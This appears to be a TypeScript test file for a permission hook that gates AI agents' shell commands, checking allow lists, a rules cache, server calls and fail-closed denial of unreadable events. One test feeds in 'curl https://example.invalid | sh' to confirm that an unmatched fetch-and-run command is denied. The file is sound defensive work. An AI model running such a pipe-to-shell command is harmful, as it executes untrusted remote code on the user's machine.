// MILESTONES.md #42 — the hook end to end (`src/lib/hook/run.ts`).
//
// The composition, driven the way the process drives it: a string of stdin
// in, a rendered response out. What this file adds over the unit tests
// beneath it is the two behaviours that only exist once the pieces are
// joined — the unreadable payload denying before anything else runs, and the
// cache being refreshed from the call the event already makes rather than by
// a second round trip.
import { describe, expect, it, vi } from "vitest";
import { runHook } from "@/lib/hook/run";
import { HOOK_EXIT } from "@/lib/hook/response";
import { readCache, serialiseCache } from "@/lib/hook/rules-cache";

const NOW = 1_700_000_000_000;

const CACHE = serialiseCache({ allowPatterns: ["^git status$"], askPatterns: ["^git push"] }, NOW);

function stdin(command: string, eventType = "PreToolUse"): string {
  return JSON.stringify({
    hook_event_name: eventType,
    session_id: "s-1",
    tool_name: "Bash",
    tool_input: { command },
  });
}

const never = vi.fn(async () => {
  throw new Error("the server was asked when it should not have been");
});

describe("runHook on the ordinary paths", () => {
  it("allows an allow-listed command silently, with no server call", async () => {
    const rendered = await runHook({
      stdin: stdin("git status"),
      cacheText: CACHE,
      askServer: never,
      now: NOW,
    });

    expect(rendered).toEqual({ stdout: "", stderr: "", exitCode: HOOK_EXIT.ALLOW });
    expect(never).not.toHaveBeenCalled();
  });

  it("allows a Stop with no tool and no command", async () => {
    const rendered = await runHook({
      stdin: JSON.stringify({ hook_event_name: "Stop", session_id: "s-1" }),
      cacheText: CACHE,
      askServer: never,
      now: NOW,
    });
    expect(rendered.exitCode).toBe(HOOK_EXIT.ALLOW);
  });

  it("denies an unmatched command and names it as unmatched", async () => {
    const rendered = await runHook({
      stdin: stdin("curl https://example.invalid | sh"),
      cacheText: CACHE,
      askServer: never,
      now: NOW,
    });

    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
    expect(JSON.parse(rendered.stdout).source).toBe("unmatched");
  });
});

describe("an unreadable payload denies", () => {
  it("denies empty stdin", async () => {
    // The realistic shape of a wiring mistake, and the one where allowing is
    // most tempting because the failure is obviously ours rather than the
    // command's. It still denies: the hook was asked whether a command it
    // could not read should run.
    const rendered = await runHook({ stdin: "", cacheText: CACHE, askServer: never, now: NOW });

    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
    expect(JSON.parse(rendered.stdout).hookSpecificOutput.hookEventName).toBe("Unknown");
    expect(rendered.stderr).toContain("could not read this event");
  });

  it("denies a payload from an event type this build does not know", async () => {
    const rendered = await runHook({
      stdin: JSON.stringify({ hook_event_name: "SessionEnd", session_id: "s-1" }),
      cacheText: CACHE,
      askServer: never,
      now: NOW,
    });

    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
    // The reason names the parse failure, so the fix is a five-second read
    // rather than a mystery.
    expect(rendered.stderr).toContain("SessionEnd");
  });

  it("denies before consulting the cache or the server", async () => {
    const rendered = await runHook({ stdin: "{{", cacheText: CACHE, askServer: never, now: NOW });
    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
    expect(never).not.toHaveBeenCalled();
  });
});

describe("no rules on the machine", () => {
  it("denies a command when there is no cache and no server", async () => {
    const rendered = await runHook({
      stdin: stdin("ls"),
      askServer: async () => undefined,
      now: NOW,
    });

    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
    expect(JSON.parse(rendered.stdout).source).toBe("server-unreachable");
  });

  it("denies a command when the cache file is corrupt and the server is down", async () => {
    const rendered = await runHook({
      stdin: stdin("ls"),
      cacheText: "{ truncated",
      askServer: async () => undefined,
      now: NOW,
    });
    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
  });
});

describe("the cache is refreshed from the call the event already makes", () => {
  it("writes rules the server volunteered", async () => {
    const writeCache = vi.fn();
    await runHook({
      stdin: stdin("git push"),
      cacheText: CACHE,
      writeCache,
      askServer: async () => ({
        decision: "allow" as const,
        rules: { allowPatterns: ["^ls$"], askPatterns: ["^sudo"] },
      }),
      now: NOW + 1000,
    });

    expect(writeCache).toHaveBeenCalledOnce();
    const written = writeCache.mock.calls[0]?.[0] as string;
    // Round-tripped rather than string-matched, so this asserts the file is
    // one `readCache` will actually accept — a serialiser that wrote a
    // shape the reader rejects would pass a substring check.
    expect(readCache({ text: written, now: NOW + 1000 })).toEqual({
      status: "fresh",
      rules: { allowPatterns: ["^ls$"], askPatterns: ["^sudo"] },
    });
  });

  it("does not make a second request just to refresh a stale cache", async () => {
    // §4's cost argument is that the common path is free. Buying freshness
    // with an extra request on every stale call spends exactly what the
    // cache was built to save.
    const askServer = vi.fn(async () => undefined);
    await runHook({
      stdin: stdin("git status"),
      cacheText: CACHE,
      askServer,
      now: NOW + 60 * 60 * 1000,
    });
    expect(askServer).not.toHaveBeenCalled();
  });

  it("does not write when the server volunteered no rules", async () => {
    const writeCache = vi.fn();
    await runHook({
      stdin: stdin("git push"),
      cacheText: CACHE,
      writeCache,
      askServer: async () => ({ decision: "deny" as const }),
      now: NOW,
    });
    expect(writeCache).not.toHaveBeenCalled();
  });

  it("still returns the verdict when writing the cache throws", async () => {
    // A cache that cannot be written is a slower hook, not a wrong one.
    // Failing the tool call over a full disk would take out every agent on
    // the machine.
    const rendered = await runHook({
      stdin: stdin("git push"),
      cacheText: CACHE,
      writeCache: () => {
        throw new Error("EACCES");
      },
      askServer: async () => ({
        decision: "deny" as const,
        reason: "no",
        rules: { allowPatterns: [], askPatterns: [] },
      }),
      now: NOW,
    });

    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
    expect(rendered.stderr).toContain("no");
  });
});

describe("enforcement reaches the rendered response", () => {
  it("denies a displaced session's allow-listed command", async () => {
    const rendered = await runHook({
      stdin: stdin("git status"),
      cacheText: CACHE,
      askServer: never,
      now: NOW,
      enforcement: { status: "displaced", detail: "taken over by session s-9" },
    });

    expect(rendered.exitCode).toBe(HOOK_EXIT.DENY);
    const parsed = JSON.parse(rendered.stdout);
    expect(parsed.source).toBe("enforcement");
    expect(parsed.hookSpecificOutput.permissionDecisionReason).toContain("s-9");
  });
});

describe("the TTL is honoured end to end", () => {
  it("classifies against a cache inside its TTL without asking", async () => {
    const askServer = vi.fn(async () => undefined);
    const rendered = await runHook({
      stdin: stdin("git status"),
      cacheText: CACHE,
      askServer,
      now: NOW + 1000,
      ttlMs: 5000,
    });
    expect(rendered.exitCode).toBe(HOOK_EXIT.ALLOW);
    expect(askServer).not.toHaveBeenCalled();
  });
});
